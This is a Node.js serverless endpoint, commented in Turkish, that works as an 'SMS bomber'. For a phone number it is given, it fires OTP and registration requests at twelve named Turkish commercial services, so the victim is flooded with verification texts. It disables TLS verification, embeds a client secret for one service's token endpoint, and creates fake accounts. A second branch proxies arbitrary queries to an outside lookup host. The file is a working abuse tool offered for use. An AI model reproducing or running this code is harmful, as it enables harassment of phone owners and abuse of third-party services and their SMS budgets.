const axios = require('axios');
const https = require('https');

const agent = { httpsAgent: new https.Agent({ rejectUnauthorized: false }), timeout: 8000 };

// SMS Servis Fonksiyonları
const rnd = (n = 8) => Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');
const rnum = (n = 4) => Math.floor(Math.random() * Math.pow(10, n));
const phone0 = (p) => `0${p}`;
const phone90 = (p) => `90${p}`;

async function bim(p) { await axios.post('https://bim.veesk.net/service/v1.0/account/login', { phone: phone90(p) }, agent); return true; }
async function file(p) { const r = await axios.post('https://api.filemarket.com.tr/v1/otp/send', { mobilePhoneNumber: phone90(p) }, agent); return r.data?.data === '200 OK'; }
async function aygaz(p) { await axios.post('https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode', { Gsm: p }, agent); return true; }
async function qumpara(p) { await axios.post('https://tr-api.fisicek.com/v1.4/auth/getOTP', { msisdn: p }, agent); return true; }
async function mopas(p) {
  const tr = await axios.post('https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials', null, agent);
  if (!tr.data?.access_token) return false;
  await axios.get(`https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber=${p}`, { ...agent, headers: { authorization: `${tr.data.token_type} ${tr.data.access_token}` } });
  return true;
}
async function saka(p) { const r = await axios.post('https://mobilcrm2.saka.com.tr/api/customer/login', { gsm: phone0(p) }, agent); return r.data?.status === 1; }
async function gofody(p) { const r = await axios.post('https://backend.gofody.com/api/v1/enduser/register/', { country_code: '90', phone: p }, agent); return r.data?.success === true; }
async function scooby(p) { await axios.get(`https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90${p}`, agent); return true; }
async function pinar(p) { const r = await axios.post('https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp', { MobilePhone: p }, { ...agent, headers: { devicetype: 'android' } }); return String(r.data).toLowerCase() === 'true'; }
async function marti(p) { const r = await axios.post('https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin', { mobilePhone: p, mobilePhoneCountryCode: '90' }, agent); return r.data?.isSuccess === true; }
async function karma(p) { await axios.post('https://api.gokarma.app/v1/auth/send-sms', { phoneNumber: phone90(p), type: 'REGISTER', deviceId: rnd(16), language: 'tr-TR' }, agent); return true; }
async function englishhome(p) { await axios.post('https://www.englishhome.com:443/enh_app/users/registration/', { first_name: 'Test', last_name: 'Test', email: `t${rnum()}@gmail.com`, phone: phone0(p), password: 'Password123!', email_allowed: false, sms_allowed: false, confirm: true, tom_pay_allowed: true }, agent); return true; }

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    const { action, phone, endpoint, ...params } = req.query;

    // SMS Bomber İsteği
    if (action === 'smsbomber') {
        if (!phone) return res.status(400).json({ error: 'Telefon numarası gerekli.' });
        
        const services = ['bim', 'file', 'aygaz', 'qumpara', 'mopas', 'saka', 'gofody', 'scooby', 'pinar', 'marti', 'karma', 'englishhome'];
        let results = [];
        
        for (const s of services) {
            try {
                let isSuccess = false;
                if (s === 'bim') isSuccess = await bim(phone);
                else if (s === 'file') isSuccess = await file(phone);
                else if (s === 'aygaz') isSuccess = await aygaz(phone);
                else if (s === 'qumpara') isSuccess = await qumpara(phone);
                else if (s === 'mopas') isSuccess = await mopas(phone);
                else if (s === 'saka') isSuccess = await saka(phone);
                else if (s === 'gofody') isSuccess = await gofody(phone);
                else if (s === 'scooby') isSuccess = await scooby(phone);
                else if (s === 'pinar') isSuccess = await pinar(phone);
                else if (s === 'marti') isSuccess = await marti(phone);
                else if (s === 'karma') isSuccess = await karma(phone);
                else if (s === 'englishhome') isSuccess = await englishhome(phone);
                
                results.push({ service: s, success: isSuccess, message: isSuccess ? 'Gönderildi' : 'Yanıt başarısız' });
            } catch (e) {
                results.push({ service: s, success: false, message: e.message });
            }
        }
        return res.status(200).json({ results });
    }

    // Standart Sorgu İsteği
    if (!endpoint) return res.status(400).json({ error: 'Endpoint belirtilmedi.' });
    try {
        const response = await axios.get(`https://api.ajaxsystems.fun/${endpoint}`, { params: params, timeout: 9000 });
        return res.status(200).json(response.data);
    } catch (error) {
        return res.status(200).json({ error: error.response?.data?.message || error.message });
    }
};
